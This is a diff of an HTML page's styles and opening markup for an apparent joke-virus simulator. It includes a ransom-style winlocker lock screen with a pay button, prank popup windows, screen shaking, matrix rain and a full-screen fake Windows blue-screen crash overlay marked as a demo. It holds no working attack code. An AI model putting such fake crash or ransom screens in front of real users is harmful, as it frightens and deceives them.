@@ -8,501 +8,220 @@
 <style>
   @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap');
 
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Inter',sans-serif; background:#000; color:#fff; overflow-x:hidden; min-height:100vh; }
 
-  body {
-    font-family: 'Inter', sans-serif;
-    background: #000;
-    color: #fff;
-    overflow-x: hidden;
-    min-height: 100vh;
-  }
+  .sphere-bg { position:fixed; inset:0; z-index:0; pointer-events:none; overflow:hidden; }
+  .sphere { position:absolute; border-radius:50%; filter:blur(80px); opacity:0.16; animation:floatSphere linear infinite; }
+  .s1{width:520px;height:520px;background:radial-gradient(circle,#fff 0%,#888 60%,transparent 100%);top:-120px;left:-120px;animation-duration:18s;}
+  .s2{width:360px;height:360px;background:radial-gradient(circle,#ccc 0%,#444 60%,transparent 100%);top:40%;right:-80px;animation-duration:22s;animation-delay:-6s;}
+  .s3{width:260px;height:260px;background:radial-gradient(circle,#fff 0%,#666 60%,transparent 100%);bottom:-80px;left:30%;animation-duration:15s;animation-delay:-3s;}
+  .s4{width:420px;height:420px;background:radial-gradient(circle,#aaa 0%,#222 60%,transparent 100%);top:20%;left:60%;animation-duration:25s;animation-delay:-9s;}
+  .s5{width:200px;height:200px;background:radial-gradient(circle,#fff 0%,#555 60%,transparent 100%);bottom:20%;right:20%;animation-duration:12s;animation-delay:-4s;}
+  @keyframes floatSphere{0%{transform:translateY(0) scale(1)}33%{transform:translateY(-60px) scale(1.08)}66%{transform:translateY(30px) scale(.95)}100%{transform:translateY(0) scale(1)}}
 
-  /* ─── SPHERES ─── */
-  .sphere-bg {
-    position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden;
-  }
-  .sphere {
-    position: absolute;
-    border-radius: 50%;
-    filter: blur(80px);
-    opacity: 0.18;
-    animation: floatSphere linear infinite;
-  }
-  .s1 { width:500px;height:500px;background:radial-gradient(circle,#fff 0%,#888 60%,transparent 100%);top:-100px;left:-100px;animation-duration:18s;animation-delay:0s; }
-  .s2 { width:350px;height:350px;background:radial-gradient(circle,#ccc 0%,#444 60%,transparent 100%);top:40%;right:-80px;animation-duration:22s;animation-delay:-6s; }
-  .s3 { width:250px;height:250px;background:radial-gradient(circle,#fff 0%,#666 60%,transparent 100%);bottom:-80px;left:30%;animation-duration:15s;animation-delay:-3s; }
-  .s4 { width:400px;height:400px;background:radial-gradient(circle,#aaa 0%,#222 60%,transparent 100%);top:20%;left:60%;animation-duration:25s;animation-delay:-9s; }
-  .s5 { width:200px;height:200px;background:radial-gradient(circle,#fff 0%,#555 60%,transparent 100%);bottom:20%;right:20%;animation-duration:12s;animation-delay:-4s; }
+  .glass{background:rgba(255,255,255,.04);backdrop-filter:blur(24px) saturate(160%);-webkit-backdrop-filter:blur(24px) saturate(160%);border:1px solid rgba(255,255,255,.10);border-radius:16px;}
+  .glass-strong{background:rgba(255,255,255,.07);backdrop-filter:blur(32px) saturate(180%);-webkit-backdrop-filter:blur(32px) saturate(180%);border:1px solid rgba(255,255,255,.14);border-radius:16px;}
+  .glass-dark{background:rgba(0,0,0,.55);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.08);border-radius:12px;}
 
-  @keyframes floatSphere {
-    0%   { transform: translateY(0px) scale(1); }
-    33%  { transform: translateY(-60px) scale(1.08); }
-    66%  { transform: translateY(30px) scale(0.95); }
-    100% { transform: translateY(0px) scale(1); }
-  }
+  .nav-glass{background:rgba(0,0,0,.65);backdrop-filter:blur(30px);-webkit-backdrop-filter:blur(30px);border-bottom:1px solid rgba(255,255,255,.08);}
 
-  /* ─── GLASS ─── */
-  .glass {
-    background: rgba(255,255,255,0.04);
-    backdrop-filter: blur(24px) saturate(160%);
-    -webkit-backdrop-filter: blur(24px) saturate(160%);
-    border: 1px solid rgba(255,255,255,0.10);
-    border-radius: 16px;
-  }
-  .glass-strong {
-    background: rgba(255,255,255,0.07);
-    backdrop-filter: blur(32px) saturate(180%);
-    -webkit-backdrop-filter: blur(32px) saturate(180%);
-    border: 1px solid rgba(255,255,255,0.14);
-    border-radius: 16px;
-  }
-  .glass-dark {
-    background: rgba(0,0,0,0.55);
-    backdrop-filter: blur(20px);
-    -webkit-backdrop-filter: blur(20px);
-    border: 1px solid rgba(255,255,255,0.08);
-    border-radius: 12px;
-  }
+  .tab-btn{padding:8px 20px;border-radius:999px;font-size:13px;font-weight:500;cursor:pointer;transition:all .25s;border:1px solid transparent;color:rgba(255,255,255,.5);background:transparent;}
+  .tab-btn.active,.tab-btn:hover{background:rgba(255,255,255,.10);border-color:rgba(255,255,255,.18);color:#fff;}
 
-  /* ─── NAV ─── */
-  .nav-glass {
-    background: rgba(0,0,0,0.6);
-    backdrop-filter: blur(30px);
-    -webkit-backdrop-filter: blur(30px);
-    border-bottom: 1px solid rgba(255,255,255,0.08);
-  }
+  .win-titlebar{background:rgba(22,22,22,.97);border-bottom:1px solid rgba(255,255,255,.07);border-radius:12px 12px 0 0;display:flex;align-items:center;gap:8px;padding:10px 14px;user-select:none;}
+  .win-btn{width:12px;height:12px;border-radius:50%;cursor:pointer;flex-shrink:0;}
+  .win-close{background:#ff5f57;} .win-min{background:#febc2e;} .win-max{background:#28c840;}
+  .win-title{flex:1;text-align:center;font-size:12px;color:rgba(255,255,255,.4);font-family:'JetBrains Mono',monospace;}
 
-  /* ─── TABS ─── */
-  .tab-btn {
-    padding: 8px 20px;
-    border-radius: 999px;
-    font-size: 13px;
-    font-weight: 500;
-    cursor: pointer;
-    transition: all .25s;
-    border: 1px solid transparent;
-    color: rgba(255,255,255,0.5);
-    background: transparent;
-  }
-  .tab-btn.active, .tab-btn:hover {
-    background: rgba(255,255,255,0.10);
-    border-color: rgba(255,255,255,0.18);
-    color: #fff;
-  }
+  .linux-titlebar{background:rgba(14,14,20,.97);border-bottom:1px solid rgba(255,255,255,.06);border-radius:12px 12px 0 0;display:flex;align-items:center;justify-content:space-between;padding:8px 14px;user-select:none;}
+  .linux-title{font-size:12px;color:rgba(255,255,255,.5);font-family:'JetBrains Mono',monospace;}
+  .linux-btns{display:flex;gap:6px;}
+  .linux-btn{width:20px;height:20px;border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:10px;background:rgba(255,255,255,.08);color:rgba(255,255,255,.5);}
+  .mac-titlebar{background:rgba(22,22,24,.97);border-bottom:1px solid rgba(255,255,255,.06);border-radius:12px 12px 0 0;display:flex;align-items:center;gap:8px;padding:10px 14px;user-select:none;}
 
-  /* ─── SANDBOX CHROME BARS ─── */
-  .win-titlebar {
-    background: rgba(30,30,30,0.9);
-    border-bottom: 1px solid rgba(255,255,255,0.08);
-    border-radius: 12px 12px 0 0;
-    display: flex; align-items: center; gap: 8px; padding: 10px 14px;
-    user-select: none;
-  }
-  .win-btn { width:12px;height:12px;border-radius:50%;cursor:pointer;flex-shrink:0; }
-  .win-close { background:#ff5f57; }
-  .win-min   { background:#febc2e; }
-  .win-max   { background:#28c840; }
-  .win-title { flex:1; text-align:center; font-size:12px; color:rgba(255,255,255,0.45); font-family:'JetBrains Mono',monospace; }
+  .terminal{background:rgba(0,0,0,.88);font-family:'JetBrains Mono',monospace;font-size:12px;color:#e0e0e0;padding:12px 16px;overflow-y:auto;line-height:1.75;}
+  .terminal .prompt{color:#fff;} .terminal .cmd{color:#ccc;} .terminal .out{color:#888;} .terminal .err{color:#ff6b6b;} .terminal .ok{color:#6bff8e;} .terminal .warn{color:#ffd36b;}
+  .cursor{display:inline-block;width:8px;height:14px;background:#fff;vertical-align:middle;margin-left:2px;animation:blink 1s step-end infinite;}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
 
-  /* Linux titlebar */
-  .linux-titlebar {
-    background: rgba(20,20,28,0.95);
-    border-bottom: 1px solid rgba(255,255,255,0.06);
-    border-radius: 12px 12px 0 0;
-    display: flex; align-items: center; justify-content: space-between; padding: 8px 14px;
-    user-select: none;
-  }
-  .linux-title { font-size:12px; color:rgba(255,255,255,0.5); font-family:'JetBrains Mono',monospace; }
-  .linux-btns { display:flex; gap:6px; }
-  .linux-btn { width:20px;height:20px;border-radius:4px;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:10px;background:rgba(255,255,255,0.08);color:rgba(255,255,255,0.5); }
+  .locker-overlay{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;border-radius:0 0 12px 12px;overflow:hidden;z-index:10;}
+  @keyframes pulseSkull{0%,100%{transform:scale(1);filter:drop-shadow(0 0 20px rgba(255,50,50,.7))}50%{transform:scale(1.09);filter:drop-shadow(0 0 40px rgba(255,0,0,1))}}
+  @keyframes glowBtn{0%,100%{box-shadow:0 0 10px rgba(255,0,0,.3)}50%{box-shadow:0 0 30px rgba(255,0,0,.7)}}
 
-  /* Mac titlebar */
-  .mac-titlebar {
-    background: rgba(28,28,30,0.95);
-    border-bottom: 1px solid rgba(255,255,255,0.06);
-    border-radius: 12px 12px 0 0;
-    display: flex; align-items: center; gap: 8px; padding: 10px 14px;
-    user-select: none;
-  }
+  .win-desktop{background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);border-radius:0 0 12px 12px;position:relative;overflow:hidden;}
+  .win-taskbar{position:absolute;bottom:0;left:0;right:0;height:36px;background:rgba(0,0,0,.75);backdrop-filter:blur(10px);border-top:1px solid rgba(255,255,255,.07);display:flex;align-items:center;padding:0 8px;gap:4px;}
+  .taskbar-icon{width:28px;height:28px;border-radius:4px;background:rgba(255,255,255,.08);display:flex;align-items:center;justify-content:center;font-size:14px;cursor:pointer;}
+  .win-clock{margin-left:auto;font-size:11px;color:rgba(255,255,255,.6);font-family:'JetBrains Mono',monospace;}
+  .win-icon{display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer;padding:8px;border-radius:8px;transition:background .2s;}
+  .win-icon:hover{background:rgba(255,255,255,.08);}
+  .win-icon .ico{font-size:28px;}
+  .win-icon span{font-size:10px;color:rgba(255,255,255,.7);text-shadow:1px 1px 3px #000;white-space:nowrap;}
 
-  /* ─── TERMINAL ─── */
-  .terminal {
-    background: rgba(0,0,0,0.85);
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 12px;
-    color: #e0e0e0;
-    padding: 12px 16px;
-    overflow-y: auto;
-    line-height: 1.7;
-  }
-  .terminal .prompt { color: #fff; }
-  .terminal .cmd    { color: #ccc; }
-  .terminal .out    { color: #888; }
-  .terminal .err    { color: #ff6b6b; }
-  .terminal .ok     { color: #6bff8e; }
-  .terminal .warn   { color: #ffd36b; }
-  .terminal .cursor {
-    display:inline-block; width:8px; height:14px;
-    background:#fff; vertical-align:middle; margin-left:2px;
-    animation: blink 1s step-end infinite;
-  }
-  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
+  .deb-desktop{background:linear-gradient(135deg,#1a0a2e 0%,#0d1117 60%,#1a0a2e 100%);border-radius:0 0 12px 12px;position:relative;overflow:hidden;}
+  .mac-desktop{background:linear-gradient(160deg,#1c1c1e 0%,#2c2c2e 100%);border-radius:0 0 12px 12px;position:relative;overflow:hidden;}
+  .mac-dock{position:absolute;bottom:8px;left:50%;transform:translateX(-50%);background:rgba(255,255,255,.06);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.12);border-radius:18px;padding:6px 12px;display:flex;gap:4px;align-items:center;}
+  .dock-icon{width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:20px;cursor:pointer;transition:transform .2s;}
+  .dock-icon:hover{transform:scale(1.3) translateY(-6px);}
+  .mac-menubar{position:absolute;top:0;left:0;right:0;height:24px;background:rgba(0,0,0,.65);backdrop-filter:blur(10px);border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;padding:0 12px;gap:16px;}
+  .mac-menu-item{font-size:11px;color:rgba(255,255,255,.7);cursor:pointer;}
+  .mac-menu-item:hover{color:#fff;}
 
-  /* ─── WINLOCKER PREVIEW ─── */
-  .locker-overlay {
-    position: absolute; inset: 0;
-    background: #000;
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    border-radius: 0 0 12px 12px;
-    overflow: hidden;
-    z-index: 10;
-  }
-  .locker-skull {
-    font-size: 80px;
-    animation: pulseSkull 2s ease-in-out infinite;
-  }
-  @keyframes pulseSkull {
-    0%,100%{ transform:scale(1); filter:drop-shadow(0 0 20px rgba(255,50,50,0.7)); }
-    50%    { transform:scale(1.08); filter:drop-shadow(0 0 40px rgba(255,0,0,1)); }
-  }
-  .locker-timer {
-    font-family:'JetBrains Mono',monospace;
-    font-size: 52px;
-    font-weight: 700;
-    color: #ff3333;
-    text-shadow: 0 0 30px rgba(255,0,0,0.8);
-    letter-spacing: 4px;
-    margin-top: 12px;
-  }
-  .locker-msg {
-    font-size: 16px;
-    font-weight: 600;
-    color: #fff;
-    text-align: center;
-    max-width: 400px;
-    margin-top: 16px;
-    line-height: 1.6;
-  }
-  .locker-sub {
-    font-size: 12px;
-    color: rgba(255,100,100,0.8);
-    font-family:'JetBrains Mono',monospace;
-    margin-top: 8px;
-  }
-  .locker-btn-pay {
-    margin-top: 24px;
-    padding: 12px 36px;
-    background: rgba(255,0,0,0.2);
-    border: 2px solid #ff3333;
-    border-radius: 8px;
-    color: #ff6666;
-    font-family:'JetBrains Mono',monospace;
-    font-size: 14px;
-    font-weight: 700;
-    cursor: pointer;
-    letter-spacing: 2px;
-    transition: all .2s;
-    animation: glowBtn 2s ease-in-out infinite;
-  }
-  .locker-btn-pay:hover {
-    background: rgba(255,0,0,0.35);
-    color: #fff;
-  }
-  @keyframes glowBtn {
-    0%,100%{ box-shadow: 0 0 10px rgba(255,0,0,0.3); }
-    50%    { box-shadow: 0 0 30px rgba(255,0,0,0.7); }
-  }
+  .creator-input{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.12);border-radius:10px;padding:10px 14px;color:#fff;font-family:'Inter',sans-serif;font-size:13px;width:100%;transition:border-color .2s,background .2s;outline:none;resize:none;}
+  .creator-input:focus{border-color:rgba(255,255,255,.35);background:rgba(255,255,255,.08);}
+  .creator-input::placeholder{color:rgba(255,255,255,.3);}
+  select.creator-input option{background:#111;color:#fff;}
 
-  /* ─── WINDOWS DESKTOP SANDBOX ─── */
-  .win-desktop {
-    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-    border-radius: 0 0 12px 12px;
-    position: relative; overflow: hidden;
-  }
-  .win-taskbar {
-    position: absolute; bottom: 0; left: 0; right: 0;
-    height: 36px;
-    background: rgba(0,0,0,0.7);
-    backdrop-filter: blur(10px);
-    border-top: 1px solid rgba(255,255,255,0.08);
-    display: flex; align-items: center; padding: 0 8px; gap: 4px;
-  }
-  .taskbar-icon { width:28px;height:28px;border-radius:4px;background:rgba(255,255,255,0.08);display:flex;align-items:center;justify-content:center;font-size:14px;cursor:pointer; }
-  .win-clock { margin-left:auto; font-size:11px; color:rgba(255,255,255,0.6); font-family:'JetBrains Mono',monospace; }
-  .win-icon {
-    display: flex; flex-direction: column; align-items: center; gap: 4px;
-    cursor: pointer; padding: 8px; border-radius: 8px; transition: background .2s;
-  }
-  .win-icon:hover { background: rgba(255,255,255,0.08); }
-  .win-icon .ico { font-size: 28px; }
-  .win-icon span { font-size: 10px; color: rgba(255,255,255,0.7); text-shadow: 1px 1px 3px #000; white-space:nowrap; }
+  .creator-label{font-size:11px;font-weight:600;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;display:block;}
 
-  /* ─── DEBIAN DESKTOP ─── */
-  .deb-desktop {
-    background: linear-gradient(135deg, #1a0a2e 0%, #0d1117 60%, #1a0a2e 100%);
-    border-radius: 0 0 12px 12px; position:relative; overflow:hidden;
-  }
-  .deb-panel {
-    position:absolute; top:0; left:0; right:0;
-    height:32px;
-    background: rgba(15,5,30,0.85);
-    backdrop-filter: blur(10px);
-    border-bottom: 1px solid rgba(255,255,255,0.06);
-    display:flex; align-items:center; padding:0 12px; gap:16px;
-  }
-  .deb-menu { font-size:12px; color:rgba(255,255,255,0.7); cursor:pointer; }
-  .deb-menu:hover { color:#fff; }
+  .btn-gen{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.18);border-radius:10px;padding:12px 28px;color:#fff;font-weight:600;font-size:14px;cursor:pointer;transition:all .2s;letter-spacing:.5px;}
+  .btn-gen:hover{background:rgba(255,255,255,.15);border-color:rgba(255,255,255,.3);transform:translateY(-1px);box-shadow:0 8px 30px rgba(0,0,0,.4);}
+  .btn-danger{background:rgba(255,50,50,.1);border-color:rgba(255,50,50,.3);color:#ff6666;}
+  .btn-danger:hover{background:rgba(255,50,50,.2);border-color:rgba(255,50,50,.5);}
 
-  /* ─── MAC DESKTOP ─── */
-  .mac-desktop {
-    background: linear-gradient(160deg, #1c1c1e 0%, #2c2c2e 100%);
-    border-radius: 0 0 12px 12px; position:relative; overflow:hidden;
-  }
-  .mac-dock {
-    position:absolute; bottom:8px; left:50%; transform:translateX(-50%);
-    background: rgba(255,255,255,0.06);
-    backdrop-filter: blur(20px);
-    border: 1px solid rgba(255,255,255,0.12);
-    border-radius: 18px;
-    padding: 6px 12px;
-    display: flex; gap: 4px; align-items: center;
-  }
-  .dock-icon { width:36px;height:36px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:20px;cursor:pointer;transition:transform .2s; }
-  .dock-icon:hover { transform: scale(1.3) translateY(-6px); }
-  .mac-menubar {
-    position:absolute; top:0; left:0; right:0;
-    height:24px;
-    background:rgba(0,0,0,0.6);
-    backdrop-filter:blur(10px);
-    border-bottom:1px solid rgba(255,255,255,0.06);
-    display:flex; align-items:center; padding:0 12px; gap:16px;
-  }
-  .mac-menu-item { font-size:11px; color:rgba(255,255,255,0.7); cursor:pointer; }
-  .mac-menu-item:hover { color:#fff; }
+  ::-webkit-scrollbar{width:4px;height:4px;}
+  ::-webkit-scrollbar-track{background:transparent;}
+  ::-webkit-scrollbar-thumb{background:rgba(255,255,255,.15);border-radius:4px;}
 
-  /* ─── CREATOR FIELDS ─── */
-  .creator-input {
-    background: rgba(255,255,255,0.05);
-    border: 1px solid rgba(255,255,255,0.12);
-    border-radius: 10px;
-    padding: 10px 14px;
-    color: #fff;
-    font-family: 'Inter', sans-serif;
-    font-size: 13px;
-    width: 100%;
-    transition: border-color .2s, background .2s;
-    outline: none;
-    resize: none;
-  }
-  .creator-input:focus {
-    border-color: rgba(255,255,255,0.35);
-    background: rgba(255,255,255,0.08);
-  }
-  .creator-input::placeholder { color: rgba(255,255,255,0.3); }
+  .badge{display:inline-block;padding:2px 8px;border-radius:999px;font-size:10px;font-weight:600;letter-spacing:.5px;background:rgba(255,255,255,.08);color:rgba(255,255,255,.6);border:1px solid rgba(255,255,255,.1);}
+  .badge-red{background:rgba(255,50,50,.12);color:#ff6666;border-color:rgba(255,50,50,.2);}
+  .badge-green{background:rgba(50,255,100,.08);color:#6bff8e;border-color:rgba(50,255,100,.15);}
+  .badge-yellow{background:rgba(255,200,50,.08);color:#ffd36b;border-color:rgba(255,200,50,.15);}
+  .badge-purple{background:rgba(180,50,255,.1);color:#cc88ff;border-color:rgba(180,50,255,.2);}
+  .badge-blue{background:rgba(50,120,255,.1);color:#6699ff;border-color:rgba(50,120,255,.2);}
 
-  .creator-label {
-    font-size: 11px;
-    font-weight: 600;
-    color: rgba(255,255,255,0.45);
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    margin-bottom: 6px;
-    display: block;
-  }
+  .virus-item{display:flex;align-items:center;gap:12px;padding:10px 14px;border-radius:10px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);cursor:pointer;transition:all .2s;}
+  .virus-item:hover{background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.12);}
+  .virus-item.selected{background:rgba(255,50,50,.08);border-color:rgba(255,50,50,.2);}
 
-  .btn-gen {
-    background: rgba(255,255,255,0.08);
-    border: 1px solid rgba(255,255,255,0.18);
-    border-radius: 10px;
-    padding: 12px 28px;
-    color: #fff;
-    font-weight: 600;
-    font-size: 14px;
-    cursor: pointer;
-    transition: all .2s;
-    letter-spacing: 0.5px;
-  }
-  .btn-gen:hover {
-    background: rgba(255,255,255,0.15);
-    border-color: rgba(255,255,255,0.3);
-    transform: translateY(-1px);
-    box-shadow: 0 8px 30px rgba(0,0,0,0.4);
-  }
-  .btn-danger {
-    background: rgba(255,50,50,0.1);
-    border-color: rgba(255,50,50,0.3);
-    color: #ff6666;
-  }
-  .btn-danger:hover {
-    background: rgba(255,50,50,0.2);
-    border-color: rgba(255,50,50,0.5);
-  }
+  .page{display:none;}
+  .page.active{display:flex;flex-direction:column;}
 
-  /* ─── SCROLLBAR ─── */
-  ::-webkit-scrollbar { width: 4px; height: 4px; }
-  ::-webkit-scrollbar-track { background: transparent; }
-  ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 4px; }
+  .scan-line{position:absolute;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,rgba(255,255,255,.3),transparent);animation:scan 4s linear infinite;pointer-events:none;z-index:20;}
+  @keyframes scan{0%{top:-2px}100%{top:100%}}
 
-  /* ─── BADGE ─── */
-  .badge {
-    display: inline-block; padding: 2px 8px; border-radius: 999px;
-    font-size: 10px; font-weight: 600; letter-spacing: 0.5px;
-    background: rgba(255,255,255,0.08); color: rgba(255,255,255,0.6);
-    border: 1px solid rgba(255,255,255,0.1);
-  }
-  .badge-red { background:rgba(255,50,50,0.12); color:#ff6666; border-color:rgba(255,50,50,0.2); }
-  .badge-green { background:rgba(50,255,100,0.08); color:#6bff8e; border-color:rgba(50,255,100,0.15); }
+  .glitch{position:relative;display:inline-block;animation:glitchAnim 5s infinite;}
+  @keyframes glitchAnim{0%,95%,100%{text-shadow:none;transform:none}96%{text-shadow:2px 0 #f00,-2px 0 #0ff;transform:translateX(2px)}97%{text-shadow:-2px 0 #f00,2px 0 #0ff;transform:translateX(-2px)}98%{text-shadow:2px 0 #f00,-2px 0 #0ff;transform:translateX(0)}}
 
-  /* ─── VIRUS LIST ─── */
-  .virus-item {
-    display: flex; align-items: center; gap: 12px;
-    padding: 10px 14px;
-    border-radius: 10px;
-    background: rgba(255,255,255,0.03);
-    border: 1px solid rgba(255,255,255,0.06);
-    cursor: pointer;
-    transition: all .2s;
-  }
-  .virus-item:hover {
-    background: rgba(255,255,255,0.06);
-    border-color: rgba(255,255,255,0.12);
-  }
-  .virus-item.selected {
-    background: rgba(255,50,50,0.08);
-    border-color: rgba(255,50,50,0.2);
-  }
+  .danger-bg{position:absolute;inset:0;pointer-events:none;z-index:1;background:repeating-linear-gradient(0deg,transparent,transparent 4px,rgba(255,0,0,.015) 4px,rgba(255,0,0,.015) 5px);}
 
-  /* ─── SECTION TRANSITIONS ─── */
-  .page { display:none; }
-  .page.active { display:flex; flex-direction:column; }
+  #notif{position:fixed;top:20px;right:20px;z-index:9999;transform:translateX(130%);transition:transform .35s cubic-bezier(.34,1.56,.64,1);}
+  #notif.show{transform:translateX(0);}
 
-  /* Animated scan line */
-  .scan-line {
-    position:absolute; left:0; right:0; height:2px;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-    animation: scan 4s linear infinite;
-    pointer-events:none; z-index:20;
-  }
-  @keyframes scan { 0%{top:-2px} 100%{top:100%} }
+  /* Popup window style (for joke viruses) */
+  .popup-win{position:fixed;z-index:99999;background:#c0c0c0;border:2px solid #fff;border-right-color:#808080;border-bottom-color:#808080;box-shadow:2px 2px 0 #000;font-family:Tahoma,sans-serif;font-size:12px;min-width:280px;animation:popIn .15s ease;}
+  @keyframes popIn{from{transform:scale(.8);opacity:0}to{transform:scale(1);opacity:1}}
+  .popup-win .popup-title{background:linear-gradient(90deg,#000080,#1084d0);color:#fff;padding:3px 6px;display:flex;align-items:center;justify-content:space-between;font-size:12px;font-weight:bold;cursor:move;}
+  .popup-win .popup-body{padding:14px 16px;color:#000;display:flex;align-items:flex-start;gap:12px;}
+  .popup-win .popup-icon{font-size:32px;flex-shrink:0;}
+  .popup-win .popup-text{flex:1;}
+  .popup-win .popup-btns{padding:0 16px 10px;display:flex;justify-content:center;gap:6px;}
+  .popup-win .popup-btn{background:#c0c0c0;border:2px solid #fff;border-right-color:#808080;border-bottom-color:#808080;padding:3px 20px;font-size:12px;cursor:pointer;font-family:Tahoma,sans-serif;}
+  .popup-win .popup-btn:active{border-color:#808080;border-right-color:#fff;border-bottom-color:#fff;}
+  .popup-win .close-x{background:none;border:none;color:#fff;cursor:pointer;font-size:12px;font-family:Tahoma,sans-serif;padding:0 4px;}
 
-  /* Glitch text */
-  .glitch {
-    position:relative; display:inline-block;
-    animation: glitchAnim 5s infinite;
-  }
-  @keyframes glitchAnim {
-    0%,95%,100%{ text-shadow:none; transform:none; }
-    96%{ text-shadow: 2px 0 #ff0000, -2px 0 #00ffff; transform:translateX(2px); }
-    97%{ text-shadow: -2px 0 #ff0000, 2px 0 #00ffff; transform:translateX(-2px); }
-    98%{ text-shadow: 2px 0 #ff0000, -2px 0 #00ffff; transform:translateX(0); }
-  }
+  /* BSOD */
+  #bsod{display:none;position:fixed;inset:0;background:#0000aa;color:#fff;font-family:'Courier New',monospace;font-size:14px;z-index:999999;padding:40px;line-height:1.8;}
 
-  /* Danger scan */
-  .danger-bg {
-    position:absolute; inset:0; pointer-events:none; z-index:1;
-    background: repeating-linear-gradient(0deg, transparent, transparent 4px, rgba(255,0,0,0.015) 4px, rgba(255,0,0,0.015) 5px);
-  }
+  /* Matrix rain */
+  #matrix-canvas{display:none;position:fixed;inset:0;z-index:999998;}
 
-  /* ─── POPUP NOTIFICATION ─── */
-  #notif {
-    position:fixed; top:20px; right:20px; z-index:9999;
-    transform:translateX(120%); transition:transform .35s cubic-bezier(.34,1.56,.64,1);
-  }
-  #notif.show { transform:translateX(0); }
+  /* Shake */
+  @keyframes shake{0%,100%{transform:translate(0)}10%,50%,90%{transform:translate(-8px,4px)}20%,60%{transform:translate(8px,-4px)}30%,70%{transform:translate(-4px,8px)}40%,80%{transform:translate(4px,-8px)}}
+  .shaking{animation:shake 0.08s linear infinite;}
 
-  select.creator-input option { background:#111; color:#fff; }
+  /* XP style error */
+  .xp-popup{position:fixed;bottom:60px;right:20px;z-index:99999;width:320px;background:#fff;border:1px solid #888;box-shadow:2px 2px 6px rgba(0,0,0,.4);font-family:Tahoma,sans-serif;font-size:12px;color:#000;animation:popIn .2s ease;}
+  .xp-popup .xp-title{background:linear-gradient(90deg,#000080,#1084d0);color:#fff;padding:3px 6px;display:flex;align-items:center;justify-content:space-between;}
+
+  /* Taskbar popup */
+  .sys-notif{position:fixed;bottom:50px;right:10px;background:#ffffcc;border:1px solid #888;padding:8px 12px;font-family:Tahoma,sans-serif;font-size:11px;color:#000;z-index:99990;max-width:280px;box-shadow:2px 2px 4px rgba(0,0,0,.3);animation:popIn .2s ease;}
 </style>
 </head>
 <body>
 
 <!-- SPHERE BG -->
 <div class="sphere-bg">
-  <div class="sphere s1"></div>
-  <div class="sphere s2"></div>
-  <div class="sphere s3"></div>
-  <div class="sphere s4"></div>
-  <div class="sphere s5"></div>
+  <div class="sphere s1"></div><div class="sphere s2"></div><div class="sphere s3"></div><div class="sphere s4"></div><div class="sphere s5"></div>
 </div>
+
+<!-- BSOD OVERLAY -->
+<div id="bsod">
+  <div style="background:#fff;color:#0000aa;display:inline-block;padding:2px 8px;font-size:14px;margin-bottom:20px;">Windows</div>
+  <p>A problem has been detected and Windows has been shut down to prevent damage to your computer.</p>
+  <br>
+  <p>SALIENWIN_KERNEL_PANIC_EXCEPTION</p>
+  <br>
+  <p>If this is the first time you've seen this stop error screen, restart your computer. If this screen appears again, follow these steps:</p>
+  <br>
+  <p>Check to make sure any new hardware or software is properly installed. If this is a new installation ask your hardware or software manufacturer for any Windows updates you might need.</p>
+  <br>
+  <p>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use safe mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.</p>
+  <br>
+  <p>Technical information:</p>
+  <p>*** STOP: 0x000000D1 (0x000000C4, 0x00000002, 0x00000000, 0xF86B5A89)</p>
+  <br>
+  <p id="bsod-collecting">Collecting data for crash dump ...</p>
+  <p id="bsod-init" style="display:none;">Initializing disk for crash dump ...</p>
+  <p id="bsod-progress">Physical memory dump progress: <span id="bsod-pct">0</span>%</p>
+  <br>
+  <p>Physical memory dump complete.</p>
+  <p>Contact your system administrator or technical support group for further assistance.</p>
+  <br>
+  <button onclick="document.getElementById('bsod').style.display='none'" style="background:#0000aa;color:#aaaaff;border:1px solid #aaaaff;padding:4px 16px;font-family:'Courier New';cursor:pointer;font-size:13px;">[ DISMISS DEMO ]</button>
+</div>
+
+<!-- MATRIX CANVAS -->
+<canvas id="matrix-canvas"></canvas>
+<button id="matrix-close" onclick="stopMatrix()" style="display:none;position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:9999999;background:rgba(0,255,0,.15);border:1px solid #0f0;color:#0f0;padding:6px 20px;font-family:'JetBrains Mono',monospace;font-size:13px;cursor:pointer;border-radius:6px;">✕ STOP MATRIX</button>
 
 <!-- NOTIFICATION -->
 <div id="notif">
-  <div class="glass-strong px-5 py-3 flex items-center gap-3" style="border-radius:12px; min-width:260px;">
+  <div class="glass-strong px-5 py-3 flex items-center gap-3" style="border-radius:12px;min-width:260px;">
     <span id="notifIcon" style="font-size:18px;">✅</span>
-    <span id="notifMsg" style="font-size:13px; font-weight:500;"></span>
